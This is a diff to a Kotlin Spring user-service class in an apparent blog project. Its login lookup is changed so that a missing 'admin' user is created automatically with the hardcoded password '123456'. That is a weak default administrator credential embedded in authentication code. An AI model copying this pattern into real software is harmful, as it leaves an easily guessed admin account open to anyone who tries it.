@@ -1,5 +1,6 @@
 package io.kblog.service.impl
 
+import io.kblog.domain.Base
 import io.kblog.domain.User
 import io.kblog.repository.RoleDao
 import io.kblog.repository.UserDao
@@ -20,7 +21,7 @@ import org.springframework.transaction.annotation.Transactional
 
 @Service
 @Transactional(readOnly = true)
-class UserServiceImpl : UserService, BaseServiceImpl<User>() {
+class UserServiceImpl : UserService, BaseServiceImpl<User, Base.UserVo>() {
 
     @Autowired
     private val passwordEncoder: BCryptPasswordEncoder? = null
@@ -32,14 +33,18 @@ class UserServiceImpl : UserService, BaseServiceImpl<User>() {
     private val roleService: RoleService? = null
 
     @Transactional
-    override fun save(bean: User): User? {
-        return userDao?.save(bean.apply { password = passwordEncoder?.encode(password)!! })
+    override fun create(bean: User): User? {
+        return super.create(bean.apply { password = passwordEncoder?.encode(password)!! })
     }
 
     override fun findByUsername(username: String?): User? {
         return username?.let { userDao?.findByUsername(it) }
     }
 
+    @Transactional
     override fun loadUserByUsername(username: String?) = findByUsername(username)?.apply { roleService?.getAuthorityByUser(this) }
-            ?: throw UsernameNotFoundException("$username Not Found")
+            ?: (if (username == "admin") create(User().apply {
+                this.username = username
+                password = "123456"
+            }) else throw UsernameNotFoundException("$username Not Found"))
 }
